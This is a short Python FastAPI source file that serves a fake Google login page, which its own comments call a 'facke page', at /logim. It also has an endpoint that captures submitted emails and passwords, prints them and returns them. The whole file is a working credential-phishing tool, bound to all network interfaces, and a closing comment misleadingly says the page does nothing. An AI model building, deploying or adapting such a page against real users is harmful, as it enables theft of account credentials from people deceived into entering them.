# author: italo Lima
# date: 2025-1-10
#  facke page : http://localhost:8000/logim
#  page to view password and email: http://localhost:8000/secret/password/status

from fastapi import FastAPI
from fastapi.responses import HTMLResponse, JSONResponse
from components import google_log
import uvicorn

app = FastAPI()

@app.get("/logim")
def home_page():
    return HTMLResponse(content=google_log())

@app.post("/secret/password/status")
async def submit(data: dict):
    email = data.get("email")
    password = data.get("password")
    print(f"Email: {email}")
    print(f"Password: {password}")
    return JSONResponse({"email": email, "password": password})

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000) # you don't need to access this page, it doesn't do anything
